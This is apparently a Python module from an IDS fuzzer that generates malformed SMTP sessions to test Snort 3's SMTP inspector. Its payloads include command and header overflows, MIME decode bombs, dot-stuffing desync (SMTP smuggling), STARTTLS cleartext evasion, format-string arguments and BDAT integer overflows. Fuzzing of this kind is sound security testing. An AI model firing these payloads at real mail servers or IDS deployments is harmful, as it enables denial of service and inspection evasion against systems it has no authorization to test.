import base64
import random

# ---------------------------------------------------------------------------
# SMTP mutation strategies for Snort 3's `smtp` service inspector.
#
# Design (grounded in RFC 5321 + the Snort SMTP inspector internals):
#
# Snort's SMTP inspector is a stateful service inspector that:
#   * parses commands and enforces line-length limits
#     (max_command_line_len ~512 per RFC 5321 §4.5.3.1.4, alt_max_command_line_len
#     per-command), tracks a COMMAND <-> DATA state machine, and normalizes
#     commands (the historic X-LINK2STATE overflow, CVE-2005-3252, lived here);
#   * tracks the DATA phase and the end-of-data indicator <CRLF>.<CRLF>, with
#     dot-stuffing transparency (RFC 5321 §4.5.2) — the desync surface;
#   * decodes MIME attachments (base64 / quoted-printable / uuencode / bitenc)
#     bounded by *_decode_depth and max_mime_mem, and scans multipart boundaries;
#   * parses the RFC 5322 header section inside DATA (max_header_line_len);
#   * handles AUTH (base64 blobs) and STARTTLS (after which it stops inspecting
#     — a cleartext-evasion gap), and BDAT/CHUNKING (RFC 3030).
#
# Every payload begins with a structurally VALID SMTP preamble (EHLO, often a
# MAIL/RCPT/DATA envelope) so Snort's service binder classifies the stream as
# SMTP and engages the inspector BEFORE it reaches the malicious bytes — the
# same "warm up the inspector" approach used by protocol/ftp.py.
#
# All strategies are client->server and are delivered with
# StreamTransport.wrap_tcp_session (pipe mode) or LiveNetworkTransport.send_tcp
# to port 25 (live mode).
# ---------------------------------------------------------------------------

SMTP_STRATEGIES = [
    "cmd_overflow",
    "header_overflow",
    "mime_decode_bomb",
    "mime_boundary_confusion",
    "data_desync",
    "state_machine_violation",
    "pipeline_flood",
    "rcpt_bomb",
    "xlink2state",
    "bdat_chunk",
    "auth_overflow",
    "starttls_evasion",
    "encoding_attack",
    "command_fuzz",
]

# Base weights (raw; normalised downstream). The deepest / highest-yield parser
# surfaces (command + header overflow, MIME decoders, data-desync) get the most
# mass; legacy/edge strategies get less.
SMTP_WEIGHTS = [14, 14, 12, 10, 10, 6, 6, 6, 5, 5, 4, 4, 6, 8]

SMTP_STRATEGY_LABELS = {
    "cmd_overflow":            "Command Overflow",
    "header_overflow":         "Header Field Overflow",
    "mime_decode_bomb":        "MIME Decode Bomb",
    "mime_boundary_confusion": "MIME Boundary Confusion",
    "data_desync":             "DATA Desync (Dot)",
    "state_machine_violation": "State Machine Violation",
    "pipeline_flood":          "Pipeline Flood",
    "rcpt_bomb":               "RCPT Bomb",
    "xlink2state":             "X-Link2State (legacy)",
    "bdat_chunk":              "BDAT Chunk Attack",
    "auth_overflow":           "AUTH Overflow",
    "starttls_evasion":        "STARTTLS Evasion",
    "encoding_attack":         "Command Encoding Attack",
    "command_fuzz":            "Verb Argument Fuzz",
}


# A valid ESMTP preamble so Snort fingerprints the stream as SMTP and engages
# the inspector before the malicious payload.
_EHLO = b"EHLO fuzzer.example.com\r\n"
_MAIL = b"MAIL FROM:<attacker@example.com>\r\n"
_RCPT = b"RCPT TO:<victim@victim.example.com>\r\n"

# Benign stand-in for "hidden" content. We are fuzzing the inspector's parsing /
# decoding / extraction paths, NOT testing AV signatures — so this is not real
# EICAR and won't trip the target host's antivirus.
_MARKER = b"FUZZ-HIDDEN-PAYLOAD-MARKER-0123456789ABCDEF"


def _b64(data: bytes) -> bytes:
    """Base64 wrapped at 76 cols + CRLF, as MIME mailers emit it."""
    raw = base64.b64encode(data)
    lines = [raw[i:i + 76] for i in range(0, len(raw), 76)]
    return b"\r\n".join(lines)


def _data_envelope(headers: bytes, body: bytes, terminate: bool = True) -> bytes:
    """Build a full MAIL/RCPT/DATA transaction carrying the given RFC 5322
    header section + body. The DATA phase is terminated by <CRLF>.<CRLF> unless
    `terminate` is False (used by the desync strategy)."""
    msg = _EHLO + _MAIL + _RCPT + b"DATA\r\n" + headers + b"\r\n" + body
    if terminate:
        if not msg.endswith(b"\r\n"):
            msg += b"\r\n"
        msg += b".\r\n"
    return msg


def build_smtp_payload(strategy: str) -> bytes:
    """Build one SMTP payload (client->server bytes) for the given strategy."""

    if strategy == "cmd_overflow":
        # Oversized command lines / arguments. RFC 5321 §4.5.3.1: command line
        # 512 octets, path 256, domain 255, local-part 64. Each variant blows a
        # different bound that Snort's command-line buffer / alt_max_command_line
        # tracking must allocate for.
        variant = random.choice([
            "giant_cmd_line", "long_local_part", "long_domain", "long_path",
            "giant_verb", "helo_overflow",
        ])
        if variant == "giant_cmd_line":
            # MAIL FROM line far past the 512-octet command-line limit.
            return _EHLO + b"MAIL FROM:<" + (b"A" * 64000) + b"@x.com>\r\n"
        elif variant == "long_local_part":
            # local-part >> 64 octets (RFC 5321 §4.5.3.1.1).
            return _EHLO + b"MAIL FROM:<" + (b"u" * 60000) + b"@example.com>\r\n"
        elif variant == "long_domain":
            # domain >> 255 octets (§4.5.3.1.2).
            return _EHLO + b"RCPT TO:<victim@" + (b"d" * 60000) + b".com>\r\n"
        elif variant == "long_path":
            # source-route style path >> 256 octets (§4.5.3.1.3).
            route = b",".join(b"@host%d.relay.example.com" % i for i in range(2000))
            return _EHLO + b"MAIL FROM:<" + route + b":a@b.com>\r\n"
        elif variant == "giant_verb":
            # Oversized command token; starts with real "MAIL" so the wizard
            # still classifies as SMTP, then chokes on the 40 KB verb.
            return _EHLO + b"MAIL" + (b"X" * 40000) + b" FROM:<a@b.com>\r\n"
        else:  # helo_overflow
            return b"EHLO " + (b"h" * 60000) + b"\r\n"

    elif strategy == "header_overflow":
        # DATA-phase RFC 5322 header section abuse. Targets Snort's
        # max_header_line_len and header-table tracking inside the DATA state.
        variant = random.choice([
            "giant_value", "giant_name", "many_headers", "obs_fold",
            "bare_cr_lf", "no_blank_line",
        ])
        if variant == "giant_value":
            headers = b"Subject: " + (b"V" * 60000) + b"\r\nFrom: a@b.com\r\n"
        elif variant == "giant_name":
            headers = (b"X" * 50000) + b": value\r\nFrom: a@b.com\r\n"
        elif variant == "many_headers":
            headers = b"".join(b"X-Custom-%d: v%d\r\n" % (i, i) for i in range(8000))
        elif variant == "obs_fold":
            # Obsolete folding (RFC 5322 obs-fold): a value continued across many
            # physical lines — stresses header line reassembly.
            lines = [b"Subject: start\r\n"]
            for _ in range(4000):
                lines.append(b"\t continued folded value\r\n")
            headers = b"".join(lines)
        elif variant == "bare_cr_lf":
            # Bare CR / bare LF inside the header section instead of CRLF.
            headers = b"Subject: a\rX-Inject: b\nX-Two: c\r\n"
        else:  # no_blank_line — header section that never terminates with a blank
            headers = b"".join(b"X-H%d: %d\r\n" % (i, i) for i in range(6000))
            # Send DATA without the header/body separator, unterminated.
            return _EHLO + _MAIL + _RCPT + b"DATA\r\n" + headers
        return _data_envelope(headers, _MARKER + b"\r\n")

    elif strategy == "mime_decode_bomb":
        # Stress Snort's MIME decoders: base64 / quoted-printable / uuencode and
        # the *_decode_depth / max_mime_mem bounds.
        variant = random.choice([
            "b64_bomb", "b64_invalid", "b64_no_wrap", "qp_bomb", "qp_malformed",
            "uuencode", "nested_b64", "decode_depth",
        ])
        cte_b64 = (b"Content-Type: application/octet-stream\r\n"
                   b"Content-Transfer-Encoding: base64\r\n")
        if variant == "b64_bomb":
            # ~3 MB of highly compressible content base64-encoded → large decode
            # output that must be buffered against max_mime_mem.
            body = cte_b64 + b"\r\n" + _b64(b"\x00" * (3 * 1024 * 1024)) + b"\r\n"
        elif variant == "b64_invalid":
            # Valid CTE header but the body is NOT valid base64 — breaks the
            # decoder state machine mid-stream.
            body = (cte_b64 + b"\r\n" +
                    (b"!!!!not@@@@base64####" * 2000) + b"\r\n")
        elif variant == "b64_no_wrap":
            # One enormous unwrapped base64 line (no 76-col CRLF wrapping) — many
            # parsers assume bounded line length.
            body = (cte_b64 + b"\r\n" + base64.b64encode(b"M" * 200000) + b"\r\n")
        elif variant == "qp_bomb":
            # Quoted-printable with a flood of =XX escapes (qp_decode_depth).
            body = (b"Content-Transfer-Encoding: quoted-printable\r\n\r\n" +
                    (b"=41=42=43=44" * 16000) + b"\r\n")
        elif variant == "qp_malformed":
            # Malformed QP: lone '=', non-hex after '=', soft-break abuse.
            body = (b"Content-Transfer-Encoding: quoted-printable\r\n\r\n" +
                    (b"=ZZ=G1=" + b"x" * 50 + b"=\r\n") * 2000)
        elif variant == "uuencode":
            # uuencoded section (uu_decode_depth) with an over-long length byte.
            lines = [b"Content-Transfer-Encoding: x-uuencode\r\n\r\n",
                     b"begin 644 payload\r\n"]
            for _ in range(2000):
                lines.append(b"M" + bytes(random.choices(range(32, 96), k=60)) + b"\r\n")
            lines.append(b"`\r\nend\r\n")
            body = b"".join(lines)
        elif variant == "nested_b64":
            # Base64 of base64 — double-decode pressure.
            body = cte_b64 + b"\r\n" + _b64(base64.b64encode(b"N" * 100000)) + b"\r\n"
        else:  # decode_depth — many tiny encoded parts to exhaust decode-depth tracking
            parts = []
            for i in range(3000):
                parts.append(b"--bound\r\n" + cte_b64 + b"\r\n" +
                             base64.b64encode(b"chunk%d" % i) + b"\r\n")
            body = (b'Content-Type: multipart/mixed; boundary="bound"\r\n\r\n'
                    + b"".join(parts) + b"--bound--\r\n")
        headers = b"From: a@b.com\r\nSubject: mime\r\nMIME-Version: 1.0\r\n"
        return _data_envelope(headers, body)

    elif strategy == "mime_boundary_confusion":
        # multipart boundary scanner stress. Targets how Snort tracks part
        # boundaries while extracting attachments for file inspection.
        variant = random.choice([
            "missing_close", "oversized_boundary", "nested", "many_parts",
            "bad_boundary", "boundary_mismatch",
        ])
        if variant == "oversized_boundary":
            boundary = b"b" * 8000
        elif variant == "bad_boundary":
            boundary = b'has spaces "quotes" and \x00null'
        else:
            boundary = b"----=_Part_" + bytes(random.choices(b"abcdef0123456789", k=12))
        sep = b"--" + boundary + b"\r\n"
        part = (sep + b'Content-Type: application/octet-stream\r\n'
                b"Content-Transfer-Encoding: base64\r\n\r\n" +
                _b64(_MARKER * 4) + b"\r\n")
        if variant == "missing_close":
            body = part * 60                      # never sends the closing --boundary--
        elif variant == "nested":
            inner = b"inner" + bytes(random.choices(b"0123456789", k=8))
            body = (sep + b"Content-Type: multipart/mixed; boundary=" + inner +
                    b"\r\n\r\n" + (b"--" + inner + b"\r\n" + part) * 30 +
                    b"--" + inner + b"--\r\n")
        elif variant == "many_parts":
            body = part * 3000 + b"--" + boundary + b"--\r\n"
        elif variant == "boundary_mismatch":
            # Declared boundary differs from the one actually used in the body.
            body = (b"--WRONGBOUNDARY\r\n" + part * 40 + b"--WRONGBOUNDARY--\r\n")
        else:  # bad_boundary close
            body = part + b"--" + boundary + b"--\r\n"
        headers = (b"From: a@b.com\r\nMIME-Version: 1.0\r\n"
                   b"Content-Type: multipart/mixed; boundary=" + boundary + b"\r\n")
        return _data_envelope(headers, body)

    elif strategy == "data_desync":
        # End-of-data transparency / dot-stuffing attacks (RFC 5321 §4.5.2).
        # Desync between Snort's DATA-state dot tracker and the real MTA — the
        # SMTP-smuggling class. We deliberately do NOT send a clean <CRLF>.<CRLF>.
        variant = random.choice([
            "bare_lf_dot", "bare_cr_dot", "double_dot_only", "premature_dot",
            "dot_no_crlf", "lf_dot_lf", "split_terminator",
        ])
        headers = b"From: a@b.com\r\nSubject: desync\r\n"
        prefix = _EHLO + _MAIL + _RCPT + b"DATA\r\n" + headers + b"\r\n" + _MARKER
        if variant == "bare_lf_dot":
            # LF-only end-of-data: "\n.\n" instead of "\r\n.\r\n".
            return prefix + b"\n.\n" + b"RSET\r\n"
        elif variant == "bare_cr_dot":
            return prefix + b"\r.\r" + b"NOOP\r\n"
        elif variant == "double_dot_only":
            # Body line "..": after de-stuffing it's ".", which some parsers may
            # treat as end-of-data.
            return prefix + b"\r\n..\r\nMORE-HIDDEN-DATA\r\n.\r\n"
        elif variant == "premature_dot":
            # A "." appears at the start of a body line before the real end.
            return prefix + b"\r\n.\r\nMAIL FROM:<smuggled@evil.com>\r\n"
        elif variant == "dot_no_crlf":
            # Dot terminator with no trailing CRLF — EOF-style.
            return prefix + b"\r\n."
        elif variant == "lf_dot_lf":
            return prefix + b"\r\n\n.\n\r\n"
        else:  # split_terminator — CRLF, then dot far later (forces boundary tracking)
            return prefix + (b"X" * 4096) + b"\r\n.\r\n"

    elif strategy == "state_machine_violation":
        # Illegal command sequencing. RFC 5321 §3.3 / §4.1.4 — exercises Snort's
        # SMTP command-state machine and the 503 "bad sequence" paths.
        variant = random.choice([
            "data_before_mail", "rcpt_before_mail", "double_mail",
            "cmd_after_quit", "rset_storm", "data_no_rcpt",
        ])
        if variant == "data_before_mail":
            return _EHLO + b"DATA\r\n" + _MARKER + b"\r\n.\r\n"
        elif variant == "rcpt_before_mail":
            return _EHLO + (_RCPT * 50)
        elif variant == "double_mail":
            # Many MAIL FROM with no intervening transaction reset.
            return _EHLO + (_MAIL * 2000)
        elif variant == "cmd_after_quit":
            lines = [_EHLO, b"QUIT\r\n"]
            for _ in range(2000):
                lines.append(random.choice([_MAIL, _RCPT, b"DATA\r\n", b"NOOP\r\n"]))
            return b"".join(lines)
        elif variant == "rset_storm":
            return _EHLO + (b"MAIL FROM:<a@b.com>\r\nRSET\r\n" * 3000)
        else:  # data_no_rcpt — MAIL then DATA with no RCPT
            return _EHLO + _MAIL + b"DATA\r\n" + _MARKER + b"\r\n.\r\n"

    elif strategy == "pipeline_flood":
        # Pipeline many full transactions / commands in one TCP segment. Stresses
        # per-command state transitions and command-history tracking.
        variant = random.choice(["full_txns", "noop_flood", "mixed_cmds"])
        if variant == "full_txns":
            txn = (_MAIL + _RCPT + b"DATA\r\n" + b"Subject: x\r\n\r\n" +
                   _MARKER + b"\r\n.\r\n")
            return _EHLO + txn * 800
        elif variant == "noop_flood":
            return _EHLO + b"NOOP\r\n" * 8000
        else:  # mixed_cmds
            cmds = [_MAIL, _RCPT, b"NOOP\r\n", b"RSET\r\n", b"VRFY root\r\n",
                    b"HELP\r\n", b"EHLO x\r\n"]
            return _EHLO + b"".join(random.choice(cmds) for _ in range(6000))

    elif strategy == "rcpt_bomb":
        # Recipient-buffer exhaustion. RFC 5321 §4.5.3.1.8 mandates buffering at
        # least 100 recipients; Snort tracks recipients per transaction.
        variant = random.choice(["many_rcpt", "many_rcpt_long", "rcpt_params"])
        if variant == "many_rcpt":
            rcpts = b"".join(b"RCPT TO:<user%d@victim.example.com>\r\n" % i
                             for i in range(10000))
        elif variant == "many_rcpt_long":
            rcpts = b"".join(b"RCPT TO:<" + (b"u" * 200) + b"%d@v.com>\r\n" % i
                             for i in range(3000))
        else:  # rcpt_params — ESMTP params (NOTIFY/ORCPT) appended to each RCPT
            rcpts = b"".join(
                b"RCPT TO:<u%d@v.com> NOTIFY=SUCCESS,FAILURE ORCPT=rfc822;u%d@v.com\r\n"
                % (i, i) for i in range(4000))
        return _EHLO + _MAIL + rcpts

    elif strategy == "xlink2state":
        # The legacy X-LINK2STATE command overflow (CVE-2005-3252) plus other
        # unknown/vendor verbs carrying huge chunked arguments. Classic SMTP
        # command-parser overflow surface.
        variant = random.choice(["xlink_chunk", "xlink_giant", "unknown_verbs"])
        if variant == "xlink_chunk":
            # X-LINK2STATE with a "CHUNK=" argument far past any line limit.
            return _EHLO + b"X-LINK2STATE CHUNK=" + (b"A" * 60000) + b"\r\n"
        elif variant == "xlink_giant":
            lines = [_EHLO]
            for _ in range(500):
                lines.append(b"X-LINK2STATE FIRST CHUNK=" +
                             bytes(random.choices(range(33, 127), k=1000)) + b"\r\n")
            return b"".join(lines)
        else:  # unknown_verbs — vendor/unknown commands with oversized args
            verbs = [b"XEXCH50", b"X-EXPS", b"XADR", b"BURL", b"ATRN", b"ETRN"]
            lines = [_EHLO]
            for _ in range(1500):
                v = random.choice(verbs)
                lines.append(v + b" " + (b"Z" * random.randint(500, 5000)) + b"\r\n")
            return b"".join(lines)

    elif strategy == "bdat_chunk":
        # BDAT / CHUNKING (RFC 3030). Binary chunk-size integer parsing + the
        # data-mode tracking that BDAT introduces alongside DATA.
        variant = random.choice([
            "huge_size", "size_overflow", "negative_size", "size_mismatch",
            "bdat_last_confusion", "bdat_after_data",
        ])
        head = _EHLO + _MAIL + _RCPT
        if variant == "huge_size":
            # Declares 0xFFFFFFFF bytes but sends few — Snort waits/over-reads.
            return head + b"BDAT 4294967295\r\n" + (b"A" * 32)
        elif variant == "size_overflow":
            # 20-digit size → overflows a 32/64-bit chunk accumulator.
            return head + b"BDAT 99999999999999999999 LAST\r\n" + (b"B" * 32)
        elif variant == "negative_size":
            return head + b"BDAT -1\r\n" + (b"C" * 16) + b"\r\n"
        elif variant == "size_mismatch":
            # Says 4 bytes, sends 4000 before the next command.
            return head + b"BDAT 4\r\n" + (b"D" * 4000) + b"BDAT 0 LAST\r\n"
        elif variant == "bdat_last_confusion":
            # Many BDAT LAST in a row — each should end the message.
            return head + (b"BDAT 5 LAST\r\nHELLO" * 2000)
        else:  # bdat_after_data — mix DATA and BDAT modes
            return (head + b"DATA\r\n" + _MARKER + b"\r\n.\r\n" +
                    b"BDAT 10\r\n" + b"X" * 10 + b"BDAT 0 LAST\r\n")

    elif strategy == "auth_overflow":
        # AUTH with massive / invalid base64 credential blobs and continuation
        # lines. Targets auth_cmds handling + the base64 auth decoder.
        variant = random.choice([
            "auth_plain_huge", "auth_login_flow", "cram_md5", "auth_invalid_b64",
            "auth_continuation",
        ])
        if variant == "auth_plain_huge":
            blob = base64.b64encode(b"\x00user\x00" + b"P" * 60000)
            return _EHLO + b"AUTH PLAIN " + blob + b"\r\n"
        elif variant == "auth_login_flow":
            # AUTH LOGIN then oversized base64 username/password continuations.
            return (_EHLO + b"AUTH LOGIN\r\n" +
                    base64.b64encode(b"u" * 40000) + b"\r\n" +
                    base64.b64encode(b"p" * 40000) + b"\r\n")
        elif variant == "cram_md5":
            return (_EHLO + b"AUTH CRAM-MD5\r\n" +
                    base64.b64encode(b"user " + b"d" * 50000) + b"\r\n")
        elif variant == "auth_invalid_b64":
            return _EHLO + b"AUTH PLAIN " + (b"!!!not-base64===" * 3000) + b"\r\n"
        else:  # auth_continuation — flood of continuation lines
            lines = [_EHLO, b"AUTH LOGIN\r\n"]
            for _ in range(4000):
                lines.append(base64.b64encode(bytes(random.choices(range(256), k=48))) + b"\r\n")
            return b"".join(lines)

    elif strategy == "starttls_evasion":
        # STARTTLS then continue in CLEARTEXT. After STARTTLS, Snort expects a TLS
        # handshake and stops inspecting the SMTP layer — so cleartext commands /
        # DATA sent afterwards may slip past uninspected (an evasion analog to the
        # FTP "AUTH TLS then cleartext" trick already in protocol/ftp.py).
        variant = random.choice(["plain_after_tls", "tls_then_data", "repeated_tls"])
        hidden = (_MAIL + _RCPT + b"DATA\r\n" +
                  b"Subject: hidden\r\n\r\n" + _MARKER + b"\r\n.\r\n")
        if variant == "plain_after_tls":
            return _EHLO + b"STARTTLS\r\n" + hidden
        elif variant == "tls_then_data":
            # STARTTLS mid-transaction, then keep streaming cleartext DATA.
            return (_EHLO + _MAIL + _RCPT + b"STARTTLS\r\n" +
                    b"DATA\r\n" + _MARKER + b"\r\n.\r\n")
        else:  # repeated_tls — many STARTTLS toggles
            return _EHLO + (b"STARTTLS\r\n" + _MAIL) * 1000

    elif strategy == "encoding_attack":
        # Command-normalizer / line-splitter confusion at the command layer.
        variant = random.choice([
            "mixed_eol", "bare_cr", "bare_lf", "telnet_iac", "null_bytes",
            "leading_ws", "tab_separator", "case_mix",
        ])
        if variant == "mixed_eol":
            endings = [b"\r\n", b"\n", b"\r", b"\n\r", b"\r\r\n"]
            cmds = [b"NOOP", b"RSET", b"HELP", b"VRFY a", b"EHLO x"]
            lines = [_EHLO]
            for _ in range(3000):
                lines.append(random.choice(cmds) + random.choice(endings))
            return b"".join(lines)
        elif variant == "bare_cr":
            return _EHLO + b"MAIL FROM:<a@b.com>\rRCPT TO:<c@d.com>\r\n"
        elif variant == "bare_lf":
            return b"EHLO x\nMAIL FROM:<a@b.com>\nRCPT TO:<c@d.com>\nDATA\n" + _MARKER + b"\n.\n"
        elif variant == "telnet_iac":
            # Telnet IAC sequences embedded in the command stream.
            iac = [b"\xff\xf4", b"\xff\xf2", b"\xff\xfb\x03", b"\xff\xfd\x18", b"\xff\xff"]
            lines = [_EHLO]
            for _ in range(2000):
                lines.append(random.choice(iac) + b"NOOP\r\n")
            return b"".join(lines)
        elif variant == "null_bytes":
            # NUL injected into commands — IDS may truncate while the MTA doesn't.
            return _EHLO + b"MAIL FROM:<a\x00@b.com>\r\nRCPT TO:<c\x00\x00@d.com>\r\n"
        elif variant == "leading_ws":
            lines = [_EHLO]
            for _ in range(2000):
                lines.append(b"   \t  NOOP\r\n")
            return b"".join(lines)
        elif variant == "tab_separator":
            # Tab instead of space between verb and argument.
            return _EHLO + b"MAIL\tFROM:<a@b.com>\r\nRCPT\tTO:<c@d.com>\r\n"
        else:  # case_mix — verb case variations
            verbs = [b"mAiL FROM:<a@b.com>", b"RcPt TO:<c@d.com>", b"nOoP", b"eHlO x"]
            lines = [_EHLO]
            for _ in range(2000):
                lines.append(random.choice(verbs) + b"\r\n")
            return b"".join(lines)

    elif strategy == "command_fuzz":
        # Per-verb argument fuzzing (RFC 5321 §4.1.1). Each verb has distinct
        # argument-parsing rules; we torture the ones Snort actually parses.
        variant = random.choice([
            "vrfy_fmt", "expn_fmt", "mail_param_size", "mail_param_body",
            "rcpt_param", "space_around_colon", "helo_no_arg", "noop_arg",
            "mail_8bitmime", "vrfy_overflow",
        ])
        if variant == "vrfy_fmt":
            # VRFY with format specifiers / huge arg (info-disclosure verb, §3.5).
            return _EHLO + b"VRFY " + (b"%n%s%x%d" * 200) + (b"A" * 20000) + b"\r\n"
        elif variant == "expn_fmt":
            return _EHLO + b"EXPN " + (b"%s" * 500) + (b"L" * 20000) + b"\r\n"
        elif variant == "mail_param_size":
            # ESMTP SIZE= parameter with an overflowing integer (RFC 1870).
            return _EHLO + b"MAIL FROM:<a@b.com> SIZE=99999999999999999999\r\n"
        elif variant == "mail_param_body":
            return _EHLO + b"MAIL FROM:<a@b.com> BODY=" + (b"X" * 30000) + b"\r\n"
        elif variant == "rcpt_param":
            return _EHLO + _MAIL + b"RCPT TO:<a@b.com> " + (b"K" * 40000) + b"\r\n"
        elif variant == "space_around_colon":
            # RFC 5321 §3.3: spaces are NOT permitted around the colon in
            # MAIL FROM: / RCPT TO:. A common real-world parser-divergence source.
            return _EHLO + b"MAIL FROM : <a@b.com>\r\nRCPT TO : <c@d.com>\r\n"
        elif variant == "helo_no_arg":
            # HELO/EHLO with no argument (and with junk) — argument validation.
            return b"HELO\r\nEHLO\r\nEHLO \r\nHELO   \r\n"
        elif variant == "noop_arg":
            return _EHLO + b"NOOP " + (b"N" * 40000) + b"\r\n"
        elif variant == "mail_8bitmime":
            return _EHLO + b"MAIL FROM:<\x80\x81\x82@b.com> BODY=8BITMIME\r\n"
        else:  # vrfy_overflow
            return _EHLO + b"VRFY " + (b"v" * 60000) + b"\r\n"

    else:
        # Fallback: a benign, valid transaction.
        return _data_envelope(b"From: a@b.com\r\nSubject: hello\r\n", _MARKER + b"\r\n")


class SmtpMutator:
    def __init__(self, external_weights: dict = None, bandit=None):
        self.strategies = SMTP_STRATEGIES
        self._external_weights = external_weights
        self._bandit = bandit

    @property
    def weights(self):
        if self._external_weights:
            return [self._external_weights.get(s, 5) for s in self.strategies]
        return SMTP_WEIGHTS

    def mutate(self) -> tuple:
        """Returns (payload_bytes, strategy_name)."""
        if self._bandit:
            strategy = self._bandit.select_with_weights(self._external_weights or {})
        else:
            strategy = random.choices(self.strategies, weights=self.weights, k=1)[0]
        payload = build_smtp_payload(strategy)
        return payload, strategy
